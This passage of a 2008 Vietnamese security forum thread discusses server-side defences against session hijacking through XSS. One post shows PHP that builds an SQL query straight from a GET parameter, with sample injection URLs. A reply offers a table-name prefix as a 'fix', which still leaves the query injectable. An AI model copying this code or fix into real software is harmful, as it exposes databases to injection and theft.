Tuy nhiên, kiểu gì thì kiểu nhưng vẫn không thể nào hoàn hảo được. Mình phải chấp nhận sự cân bằng giữa nhiều yếu tố ở mức độ nào đó mà thôi.

P/S: Có ai thử làm post 1 bài viết trên forum HVA mà muốn xóa nó sẽ rất cực, thậm chí có thể gần như không xóa được nó nếu không biết cái trick ;-)
Cho tới thời điểm post bài, HVA vẫn bị "lỗi" này. "Lỗi" này "phá chơi" cho vui chứ không hại gì nhiều. Mà cũng rất dễ làm :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118548</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118548</link>
				<pubDate><![CDATA[Sat, 8 Mar 2008 11:37:47]]> GMT</pubDate>
				<author><![CDATA[ nbthanh]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>hì hì, bồ cứ đưa đoạn mã bị sql inj, mình đảm bảo fix đc á :P

xss như đoạn bồ vừa nói là 1 trường hợp rất hay, (cũng filter đc chớ :P giả dụ ko cho thực hiện câu javascript tiếp theo bằng dấu ; - js mà ko có ; thì có thực hiện tiếp đc ko nhỉ :-/)
@mR.Bi: lọc hết js thì mất hết hay của web rùi còn gì :D&nbsp;
		</blockquote>
hehe, XSS mà bồ đi lọc dấu chấm phẩy àh? Hay là thấy trường hợp của tui rồi mới nảy ra ý lọc dấu chấm phẩy (j/k). 
Còn đoạn code bị SQL injection là thế này đây
Tui có một website về 1 giải bóng đá (WC 2010) chẳng hạn:
giải đấu được chia ra làm <font color='red'>10000</font> bảng: #:S
muốn xem thông tin các đội trong 1 bảng, ví dụ bảng A đi: thì truy cập URL:<span class="link"> http://football.com/info.php?table=A</span>
trong source-code
<font color='orange'>$sql="select * from $_GET[table]";</font>
.......
hehe, lúc đó hacker tấn công SQL injection ở mức cơ bản
<font color='orange'>http://football.com/info.php?table=Admin</font>
hoặc
<font color='orange'>http://football.com/info.php?table=Infomation_schema.tables</font>
.....
thì bồ xây dựng bộ lọc SQL injection trong trường hợp này thế nào ??  :D 
@vivashadow: Bồ làm một bài về httpOnly đi, tui có nhiều thắc mắc về nó :D  &nbsp;
		</blockquote>

Sao lại không lọc được, chỉ cần tạo mảng chứa các table nhạy cảm hoặc có thể đặt tên table như: _A, _B
<font color='orange'>$sql="select * from _".$_GET[table];</font>

Trong PHP có hỗ trợ <font color='orange'>session_ regenerate_ id</font>, có thể sau 3 request thì tạo lại session_id. Mod vào xem bài viết (1), thực hiện xóa bài (2), trở về lại(3). Tuy nhiên cách này lại xung đột với token nếu thao tác kiểu inline mod. session_id đã đổi nhưng giá trị token của trang hiện tại vẫn còn vì chưa load lại trang.

HVA còn lờ đi phần <font color='orange'>Ghi nhớ</font>, chứ nếu có nữa thì còn nhiều vấn đề phải bàn. Không có tính năng này thì ít ra cũng nên đặt Login box bên ngoài để login cho nhanh, chứ cứ mỗi lần phải vào Đăng nhập thì rất mất cảm tình.

<font color='orange'>p/s: Theo mình thì khó mà chống mất cookie, mình chơi nghệ sĩ hơn là có lấy được nhưng không xài được  -:-) </font>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118908</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118908</link>
				<pubDate><![CDATA[Tue, 11 Mar 2008 04:38:17]]> GMT</pubDate>
				<author><![CDATA[ bietchetlien007]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">bietchetlien007 wrote:</cite><br>
		<blockquote>......

Sao lại không lọc được, chỉ cần tạo mảng chứa các table nhạy cảm hoặc có thể đặt tên table như: _A, _B
<font color='orange'>$sql="select * from _".$_GET[table];</font>

Trong PHP có hỗ trợ <font color='orange'>session_ regenerate_ id</font>, có thể sau 3 request thì tạo lại session_id. Mod vào xem bài viết (1), thực hiện xóa bài (2), trở về lại(3). Tuy nhiên cách này lại xung đột với token nếu thao tác kiểu inline mod. session_id đã đổi nhưng giá trị token của trang hiện tại vẫn còn vì chưa load lại trang.
&nbsp;
		</blockquote>
Thử suy nghĩ xem đổi sessionid sẽ giúp cái gì?

<p></p>
		<cite class="blockquote">bietchetlien007 wrote:</cite><br>
		<blockquote>
HVA còn lờ đi phần <font color='orange'>Ghi nhớ</font>, chứ nếu có nữa thì còn nhiều vấn đề phải bàn. Không có tính năng này thì ít ra cũng nên đặt Login box bên ngoài để login cho nhanh, chứ cứ mỗi lần phải vào Đăng nhập thì rất mất cảm tình.
&nbsp;
		</blockquote>
Không phải là lờ mà là cố tình. Bồ có biết lý do tại sao cố tình làm như thế không?

<p></p>
		<cite class="blockquote">bietchetlien007 wrote:</cite><br>
		<blockquote>
<font color='orange'>p/s: Theo mình thì khó mà chống mất cookie, mình chơi nghệ sĩ hơn là có lấy được nhưng không xài được  -:-) </font>&nbsp;
		</blockquote>
Hơi lạc đề. Thử lấy cookie của tôi xem có được hay không mà cho rằng <i>"Theo mình thì khó mà chống mất cookie"</i>?]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118911</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118911</link>
				<pubDate><![CDATA[Tue, 11 Mar 2008 05:42:33]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Biết chết liền :D 
Đợi 3 lần thì quá lâu, cái class này làm luôn 1 lần.
www.phpclasses.org/browse/package/2794.html

Cần có ví dụ cụ thể về cuộc tấn công của member kia, chứ vầy thì lẫn lộn giữa XSS và session hijacking + XSS
Cố tình lờ đi cái Ghi nhớ chắc là sợ bị flood hoặc gì gì đó  :D 

p/s: Cái editor của forum này chuối thật, không nhận biết được con trỏ đang ở đâu, lúc nào nó cũng chèn vào cuối bài viết.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118968</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118968</link>
				<pubDate><![CDATA[Tue, 11 Mar 2008 17:17:14]]> GMT</pubDate>
				<author><![CDATA[ bietchetlien007]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">bietchetlien007 wrote:</cite><br>
		<blockquote>Biết chết liền :D 
Đợi 3 lần thì quá lâu, cái class này làm luôn 1 lần.
www.phpclasses.org/browse/package/2794.html

Cần có ví dụ cụ thể về cuộc tấn công của member kia, chứ vầy thì lẫn lộn giữa XSS và session hijacking + XSS
Cố tình lờ đi cái Ghi nhớ chắc là sợ bị flood hoặc gì gì đó  :D 

p/s: Cái editor của forum này chuối thật, không nhận biết được con trỏ đang ở đâu, lúc nào nó cũng chèn vào cuối bài viết.&nbsp;
		</blockquote>

Nếu muốn tránh "biết chết liền" thì nên suy nghĩ cho kỹ trước khi post.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118975</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118975</link>
				<pubDate><![CDATA[Tue, 11 Mar 2008 18:03:59]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">bietchetlien007 wrote:</cite><br>
		<blockquote>Biết chết liền :D 
Đợi 3 lần thì quá lâu, cái class này làm luôn 1 lần.
www.phpclasses.org/browse/package/2794.html

Cần có ví dụ cụ thể về cuộc tấn công của member kia, chứ vầy thì lẫn lộn giữa XSS và session hijacking + XSS
Cố tình lờ đi cái Ghi nhớ chắc là sợ bị flood hoặc gì gì đó  :D 

p/s: Cái editor của forum này chuối thật, không nhận biết được con trỏ đang ở đâu, lúc nào nó cũng chèn vào cuối bài viết.&nbsp;
		</blockquote>
xem lại đi bạn, mọi người đều dùng bình thường mà, chưa thấy ai kêu ca về vấn đề này trước đây cả.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#118977</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#118977</link>
				<pubDate><![CDATA[Tue, 11 Mar 2008 18:13:20]]> GMT</pubDate>
				<author><![CDATA[ secmask]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>
...
p/s: @prof: mình chưa hiểu rõ lắm ý tưởng timestamp của bồ, có thể nói rõ thêm cho mình hiểu chút đc ko, sozy :)&nbsp;
		</blockquote>
Bạn chưa rõ <b>cụ thể</b> ở điểm nào?

P.S: Không cần phải "sozy" đâu, <i>boom_jt.</i> Không rõ thì hỏi cho rõ thôi mà :).]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#119017</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#119017</link>
				<pubDate><![CDATA[Tue, 11 Mar 2008 20:55:55]]> GMT</pubDate>
				<author><![CDATA[ prof]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ hì, mình chưa rõ là <b>cụ thể</b> (:P) cái timestamp đó đc implement thế nào :-? nội dung truyền giữa client và server là tn?]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#119039</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#119039</link>
				<pubDate><![CDATA[Tue, 11 Mar 2008 23:37:36]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>hì, mình chưa rõ là <b>cụ thể</b> (:P) cái timestamp đó đc implement thế nào :-? nội dung truyền giữa client và server là tn?&nbsp;
		</blockquote>
Ah, thì ra là bạn hỏi về cách implement. 

Theo tớ "đoán", có lẽ securityHash/token của HVA chưa gồm yếu tố <b>thời gian</b> nên có thể bị lợi dụng (Session Hijack). Vì vậy, mỗi khi một securityHash/token được tạo, sẽ kèm theo thời gian tạo token này (bên cạnh các yếu tố đặc trưng khác). Server-side sẽ qui định <i>timestamp</i> bao nhiêu đó để token còn hợp lệ (tính từ thời gian tạo) khi mods tiến hành thao tác điều hợp. Nếu bạn đã quen với các khái niệm cơ bản như cookies, sessionID, token, và cách chúng được hình thành và gửi/nhận thế nào thì việc implement thêm timestamp sẽ không quá khó khăn. Có lẽ tôi xin không đi vào tiểu tiết hơn nữa, chẳng hạn như cách tổ hợp thêm yếu tố thời gian vào securityHash/token thế nào, quản lý timestamp ra sao, lưu trữ thế nào,... vì điều này tùy thuộc vào khả năng "tuỳ biến" của mỗi người.

Hi vọng giải đáp được câu hỏi của bạn.

Thân mến.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#119118</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#119118</link>
				<pubDate><![CDATA[Wed, 12 Mar 2008 15:32:23]]> GMT</pubDate>
				<author><![CDATA[ prof]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ Mình đoán ý bạn thế này: mình sẽ sử dụng 1 khái niệm gọi là timeout, cookie sẽ chỉ hợp lệ trong 1 khoảng thời gian nhất định đúng ko? Sau khoảng thời gian đó, cookie ko còn hợp lệ, và như vậy kẻ tấn công không thể làm gì đc với cookie ko còn hợp lệ đó?

Vậy thì khi quá thời gian đó, phải chăng người dùng sẽ lại phải nhập username/password để có 1 cookie hợp lệ mới (có bất tiện cho người dùng quá ko? :-?), hay bạn sẽ thực thi cơ chế nào đó ? Mình nghĩ nên đi chi tiết vào vấn đề này để làm rõ khả năng ngăn ngừa session hijacking của phương pháp.

Cơ chế timeout này cũng đã đc áp dụng (yahoo! mail chẳng hạn), tuy nhiên thời gian timeout có thể là 1 ngày (khá dài), đủ để kẻ tấn công làm đc điều hắn muốn ...]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#119123</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#119123</link>
				<pubDate><![CDATA[Wed, 12 Mar 2008 15:53:39]]> GMT</pubDate>
				<author><![CDATA[ boom_jt]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>Mình đoán ý bạn thế này: mình sẽ sử dụng 1 khái niệm gọi là timeout, cookie sẽ chỉ hợp lệ trong 1 khoảng thời gian nhất định đúng ko? Sau khoảng thời gian đó, cookie ko còn hợp lệ, và như vậy kẻ tấn công không thể làm gì đc với cookie ko còn hợp lệ đó?&nbsp;
		</blockquote>
Uh, cơ bản là như vậy. 
<p></p>
		<cite class="blockquote">boom_jt wrote:</cite><br>
		<blockquote>
Vậy thì khi quá thời gian đó, phải chăng người dùng sẽ lại phải nhập username/password để có 1 cookie hợp lệ mới (có bất tiện cho người dùng quá ko? :-?), hay bạn sẽ thực thi cơ chế nào đó ? Mình nghĩ nên đi chi tiết vào vấn đề này để làm rõ khả năng ngăn ngừa session hijacking của phương pháp.

Cơ chế timeout này cũng đã đc áp dụng (yahoo! mail chẳng hạn), tuy nhiên thời gian timeout có thể là 1 ngày (khá dài), đủ để kẻ tấn công làm đc điều hắn muốn ...&nbsp;
		</blockquote>
Um, trước tiên ta nên thống nhất với nhau một vài giả thiết sau đây để tránh đi quá xa nhé:

- Thứ nhất, việc thảo luận giải pháp chống session hijack mà tớ đề nghị là áp dụng cho "ngữ cảnh" HVA Forum. Nên nhớ mỗi Web application có cấu trúc, kịch bản không giống nhau.
- Thứ nhì, session hijack thực sự trở nên nghiêm trọng đối với các sessions của Vmods/Mods vì kẻ tấn công có thể nhằm vào đó để gây hại cho diễn đàn thông qua các hành động Modify, Delete, v..v... Theo đó, một bộ phận không quá nhiều người dùng mới áp dụng cơ chế này.

Do đó, ý tưởng (dùng timestamp) thì như vậy, nhưng với mỗi application cụ thể nên có cách áp dụng đủ linh động và mềm dẻo. Chẳng hạn, xác định giá trị timestamp thế nào cho hợp lý, những securityHash/token nào cần dùng thêm timestamp, những trang nào thì nên áp dụng kiểu token này, v..v... những việc này cần phải cân nhắc, khảo sát kỹ càng. Một Moderator sau khi request một trang <i>moderate.xyz</i> nào đó, thì không thể sau 30 phút, hay 300 phút mới thực thi hành động Move hay Delete. Mặt khác, tớ cũng đã đề cập tới giải pháp bảo vệ securityHash/token trong khoảng thời gian timestamp rồi. Bạn đọc lại đoạn này nhé:
<p></p>
		<cite class="blockquote">prof wrote:</cite><br>
		<blockquote>
Em nghĩ có thể kết hợp thêm yếu tố Timestamp (chẳng hạn, khoảng 30 giây) cho securityHash/token (có tính duy nhất cho 1 session) hiện tại của diễn đàn. Theo đó, phía server sẽ lưu giữ một <b>table</b> các securityHash này và sẽ không chấp nhận một request nào đó nếu giá trị securityHash đã và đang được dùng trước đó. Table này sẽ chỉ lưu các securityHash trong khoảng thời gian của Timestamp sau đó sẽ được giải phóng mà không chiếm tài nguyên.

Trong trường hợp nhận được 2 requests với 2 securityHash giống nhau (bị session hijack), khi đó server-side nên cân nhắc trường hợp reject cả hai request này (vì khi đó không rõ request nào là hợp lệ) hoặc tiến hành verify lại password.&nbsp;
		</blockquote>

Thân.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#119236</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#119236</link>
				<pubDate><![CDATA[Thu, 13 Mar 2008 13:07:14]]> GMT</pubDate>
				<author><![CDATA[ prof]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ sau khi mod thực hiện một số điều hợp, quyết định save lại thay đổi thì sẽ yêu cầu verify lại password, như thế có được không nhỉ ?, chỉ áp dụng đối với mod để phù hợp với 2 yêu cầu là bảo mật và tính dễ dùng.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#119240</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#119240</link>
				<pubDate><![CDATA[Thu, 13 Mar 2008 13:54:37]]> GMT</pubDate>
				<author><![CDATA[ secmask]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía server</title>
				<description><![CDATA[  Như vậy là chúng ta đang bàn cách sao cho có thể "<b><font color='orange'>sống chung với XSS</font></b>", như kiểu "<font color='yellow'>sống chung với lũ</font>", thừong hay đề cập trên báo chí.
 Nếu như vậy tôi xin có ý kiến như dưới đây.
Nhưng trước hết xin "làm rõ" lại một câu tôi viết ở một post, tại trang 3, topic này.

<p></p>
		<cite class="blockquote">PXMMRF wrote:</cite><br>
		<blockquote>2- Khi chỉ xem forum, post bài, các Admin. không nên truy cập vào HVA forum dứoi nickname- password của một Administrator, với quyền hạn như của một "root", mà chỉ nên truy cập vào dưới nickname và password với quyền hạn như của một Mod. Còn khi config. lại Forum mới dùng quyền của Admin-root. &nbsp;
		</blockquote>
  
<p></p>
		<cite class="blockquote">ThichHacking binhluan wrote:</cite><br>
		<blockquote>Bàn về cách này của bác Mai ví dụ như kẻ tấn công đã có chủ ý và lỗi đó bị khai thác trong phần chữ ký chẳng hạn thì kẻ đó hoàn toàn có thể gởi một PM trực tiếp đến tài khoản có quyền quản trị cao nhất (chẳng hạn như quanlytruong) chẳng hạn thì khi (quanlytruong) đọc tin nhắn có kèm theo chữ ký thì hoàn toàn đã bị hacker cướp được. và lúc đó Hacker đang vẫn có thể khai thác với quyền tối cao. &nbsp;
		</blockquote>
 
  Theo ý tôi viết thì "<font color='orange'>quản lý trưởng</font>" cũng chỉ có quyền hạn đối với hệ thống như của một Mod., không hơn. Chức danh "quản lý trưởng" xuất hiện và sử dụng trên diễn đàn chỉ có ý nghĩa về mặt "hành chính", chứ không có thưc quyền như của một Admin. hay "root". Các nickname có quyền "<font color='red'>Admin</font>." hay quyền root tuyệt đối không đựoc phép xuất hiện, sử dụng trên diễn đàn, không có trong "danh sách thành viên forum" (không ai biết nickname này).

 Trở lại vấn đề "sống chung với XSS", thì tôi thấy giải pháp gợi ý của bác conmale (<i>thay thế cookie mỗi lần user tái truy cập đến HVA forum</i>) tuy khá hay, nhưng thực tế lại ít hiệu quả, vì những lý do sau:

- Khi có ý lấy cắp các thông tin liên quan đến phiên truy cập của một user vào HVA forum thì hacker luôn ở trạng thái sẵn sàng, chủ động, có thể nói là nó sẽ "túc trực" bên webserver của nó để lấy ngay các thông tin mà nó thu đựoc. Khi có thông tin, nó sẽ nhanh chóng vào đựoc ngay HVA forum dưới nickname của nạn nhân (dù lúc đầu chẳng biết nickname và pass của nạn nhân cụ thể là gì).
- Nạn nhân ít khi truy cập liên tiếp từ URL này sang URL kia, mà thừong truy cập đến một URL thì dừng lại một thời gian lâu để đọc hết bài này sang bài khác, hay post bài. Nhiều bác truy cập đến một URL xem qua một hai bài rồi bỏ máy đi ra ngoài làm việc khác, lâu mới quay lại máy tính. Hacker thừa thời gian mà truy cập vào forum, chẳng cần phải "nhanh tay, nhanh chân" hay viết thêm một script gì.
- Do forum bị lỗi XSS nên lúc nào hacker cũng thu thập đựoc thông tin của các user. Nếu nó vào không đựoc lần này    (<i>do user chạy "xô" liên tiếp qua nhiều URL</i>), thì nó vào lần sau, chắc chắn là thành công.
 
Để "<b><font color='orange'>sống chung với XSS</font></b>" (<i>nếu ta muốn như vậy hay bắt buộc phải như vậy</i>), thì tôi sẽ theo một giải pháp khác, xuất phát từ việc phân tích nguyên lý khai thác lỗi XSS của hacker.  <font color='yellow'>Tôi sẽ tìm cách để thành phần thứ 3 (tức là hacker với công cụ webserver của hacker) trong quá trình exploit scenarios, không thể phát huy bất cứ một tác dụng gì. Nghĩa là làm cho nó vô dụng.</font>
 Để làm việc này tôi đã đề cập một số giải pháp (không cho insert hình ảnh upload trên các webserver khác vào HVA forum, không cho đặt link trên forum để chỉ cần click vào link là có thể kết nối đến các webserver khác, trừ các link nội bô ...vân vân).
  Chúng ta để ý sẽ thấy rằng các trang chủ của các công ty kinh doanh tên miền nổi tiếng  thường thiết kế rất đơn giản (không hề có animation pic. hay flash gì cả), không hề hiện diện một link "sống" nào, trừ các link nội bộ. Vì các trang chủ này thường có nơi Login vào "Domain control panel", mà trong trừong hợp này thì nickname và pass của một user là tối quan trọng.
 Cũng như đã có một số website của chính phủ Mỹ, khi user chỉ chuột vào một link liên kết với một webserver bên ngoài, thì lập tức có một cửa sổ popup hiện ra, với cảnh báo đại thể là: "<i><font color='yellow'>Bạn đang rời website của chúng tôi để truy cập đến một website-webserver bên ngoài. Chúng tôi cảnh báo việc này và không chịu trách nhiệm nếu như việc này có thể gây tổn thất, rắc rối... cho bạn</font></i>". Các website này chắc đã thấy rõ tầm quan trọng của lỗi XSS cũng như việc khó loại bỏ hết lỗi XSS trong website của mình.
 Một số website khác cho phép user post các link tham khảo, nhưng không được dưới dạng "Hyperlink" mà dưới dạng text. Ngừoi đọc phải copy và dán lên một cửa sổ trình duyệt mới mở ra. 
 Ngoài ra nếu tạo điều kiện cho user được insert hình ảnh lên HVA forum thuận tiện, dễ dàng thì có lẽ sau này HVA nên có một "file uploading server" riêng. Tạo cái này thưc ra không khó.

  ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#119247</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#119247</link>
				<pubDate><![CDATA[Thu, 13 Mar 2008 16:04:34]]> GMT</pubDate>
				<author><![CDATA[ PXMMRF]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">PXMMRF wrote:</cite><br>
		<blockquote> 
Để "<b><font color='orange'>sống chung với XSS</font></b>" (<i>nếu ta muốn như vậy hay bắt buộc phải như vậy</i>), thì tôi sẽ theo một giải pháp khác, xuất phát từ việc phân tích nguyên lý khai thác lỗi XSS của hacker.  <font color='yellow'>Tôi sẽ tìm cách để thành phần thứ 3 (tức là hacker với công cụ webserver của hacker) trong quá trình exploit scenarios, không thể phát huy bất cứ một tác dụng gì. Nghĩa là làm cho nó vô dụng.</font>
 Để làm việc này tôi đã đề cập một số giải pháp (không cho insert hình ảnh upload trên các webserver khác vào HVA forum, không cho đặt link trên forum để chỉ cần click vào link là có thể kết nối đến các webserver khác, trừ các link nội bô ...vân vân).
  Chúng ta để ý sẽ thấy rằng các trang chủ của các công ty kinh doanh tên miền nổi tiếng  thường thiết kế rất đơn giản (không hề có animation pic. hay flash gì cả), không hề hiện diện một link "sống" nào, trừ các link nội bộ. Vì các trang chủ này thường có nơi Login vào "Domain control panel", mà trong trừong hợp này thì nickname và pass của một user là tối quan trọng.
 Cũng như đã có một số website của chính phủ Mỹ, khi user chỉ chuột vào một link liên kết với một webserver bên ngoài, thì lập tức có một cửa sổ popup hiện ra, với cảnh báo đại thể là: "<i><font color='yellow'>Bạn đang rời website của chúng tôi để truy cập đến một website-webserver bên ngoài. Chúng tôi cảnh báo việc này và không chịu trách nhiệm nếu như việc này có thể gây tổn thất, rắc rối... cho bạn</font></i>". Các website này chắc đã thấy rõ tầm quan trọng của lỗi XSS cũng như việc khó loại bỏ hết lỗi XSS trong website của mình.
 Một số website khác cho phép user post các link tham khảo, nhưng không được dưới dạng "Hyperlink" mà dưới dạng text. Ngừoi đọc phải copy và dán lên một cửa sổ trình duyệt mới mở ra. 
 Ngoài ra nếu tạo điều kiện cho user được insert hình ảnh lên HVA forum thuận tiện, dễ dàng thì có lẽ sau này HVA nên có một "file uploading server" riêng. Tạo cái này thưc ra không khó.
  &nbsp;
		</blockquote>
Yeah! Yeah! Yeah! Ý kiến của mình ở trên chính là muốn Admin khai triển điều này. (chỉ có điều mình chưa diễn đạt được như đồng chí PXMMRF ):D
Cảm ơn bạn PXMMRF.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#119312</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#119312</link>
				<pubDate><![CDATA[Fri, 14 Mar 2008 11:15:07]]> GMT</pubDate>
				<author><![CDATA[ done]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">done wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">PXMMRF wrote:</cite><br>
		<blockquote> 
Để "<b><font color='orange'>sống chung với XSS</font></b>" (<i>nếu ta muốn như vậy hay bắt buộc phải như vậy</i>), thì tôi sẽ theo một giải pháp khác, xuất phát từ việc phân tích nguyên lý khai thác lỗi XSS của hacker.  <font color='yellow'>Tôi sẽ tìm cách để thành phần thứ 3 (tức là hacker với công cụ webserver của hacker) trong quá trình exploit scenarios, không thể phát huy bất cứ một tác dụng gì. Nghĩa là làm cho nó vô dụng.</font>
 Để làm việc này tôi đã đề cập một số giải pháp (không cho insert hình ảnh upload trên các webserver khác vào HVA forum, không cho đặt link trên forum để chỉ cần click vào link là có thể kết nối đến các webserver khác, trừ các link nội bô ...vân vân).
  Chúng ta để ý sẽ thấy rằng các trang chủ của các công ty kinh doanh tên miền nổi tiếng  thường thiết kế rất đơn giản (không hề có animation pic. hay flash gì cả), không hề hiện diện một link "sống" nào, trừ các link nội bộ. Vì các trang chủ này thường có nơi Login vào "Domain control panel", mà trong trừong hợp này thì nickname và pass của một user là tối quan trọng.
 Cũng như đã có một số website của chính phủ Mỹ, khi user chỉ chuột vào một link liên kết với một webserver bên ngoài, thì lập tức có một cửa sổ popup hiện ra, với cảnh báo đại thể là: "<i><font color='yellow'>Bạn đang rời website của chúng tôi để truy cập đến một website-webserver bên ngoài. Chúng tôi cảnh báo việc này và không chịu trách nhiệm nếu như việc này có thể gây tổn thất, rắc rối... cho bạn</font></i>". Các website này chắc đã thấy rõ tầm quan trọng của lỗi XSS cũng như việc khó loại bỏ hết lỗi XSS trong website của mình.
 Một số website khác cho phép user post các link tham khảo, nhưng không được dưới dạng "Hyperlink" mà dưới dạng text. Ngừoi đọc phải copy và dán lên một cửa sổ trình duyệt mới mở ra. 
 Ngoài ra nếu tạo điều kiện cho user được insert hình ảnh lên HVA forum thuận tiện, dễ dàng thì có lẽ sau này HVA nên có một "file uploading server" riêng. Tạo cái này thưc ra không khó.
  &nbsp;
		</blockquote>
Yeah! Yeah! Yeah! Ý kiến của mình ở trên chính là muốn Admin khai triển điều này. (chỉ có điều mình chưa diễn đạt được như đồng chí PXMMRF ):D
Cảm ơn bạn PXMMRF.&nbsp;
		</blockquote>

Theo tôi thì giải pháp này nghiên về hướng phòng chống XSS, không cho nó xảy ra. Đây là những biện pháp tốt nhưng chủ đề mình đang bàn là: giả sử mình bị XSS và chưa khắc phục thì ở phía server mình có thể làm những gì để ngăn cản hoặc giảm thiểu dung hại tình trạng session bị hijack do mất cookie.

Tất nhiên phòng cháy hơn chữa cháy. Việc ngăn ngừa XSS xảy ra và ưu tiên một nhưng cái scope để bàn luận ở đây không phải là các phương pháp ngăn ngừa XSS.  :P ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#119315</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#119315</link>
				<pubDate><![CDATA[Fri, 14 Mar 2008 11:24:17]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Ngăn ngừa session hijacking xuyên qua XSS từ phía serv</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote>
Theo tôi thì giải pháp này nghiên về hướng phòng chống XSS, không cho nó xảy ra. Đây là những biện pháp tốt nhưng chủ đề mình đang bàn là: giả sử mình bị XSS và chưa khắc phục thì ở phía server mình có thể làm những gì để ngăn cản hoặc giảm thiểu dung hại tình trạng session bị hijack do mất cookie.

Tất nhiên phòng cháy hơn chữa cháy. Việc ngăn ngừa XSS xảy ra và ưu tiên một nhưng cái scope để bàn luận ở đây không phải là các phương pháp ngăn ngừa XSS.  :P &nbsp;
		</blockquote>

Giờ thì không biết đang lạc đề đi đâu. Lúc trước ý em cũng như thế mà, coi việc mất cookie là hiển nhiên, giờ phải tìm cách khắc phục cho session từ server. Vậy mà anh bảo là lạc đề, pó 2 tay  -:|- ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19371.html#119383</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/19371.html#119383</link>
				<pubDate><![CDATA[Fri, 14 Mar 2008 19:09:40]]> GMT</pubDate>
				<author><![CDATA[ bietchetlien007]]></author>
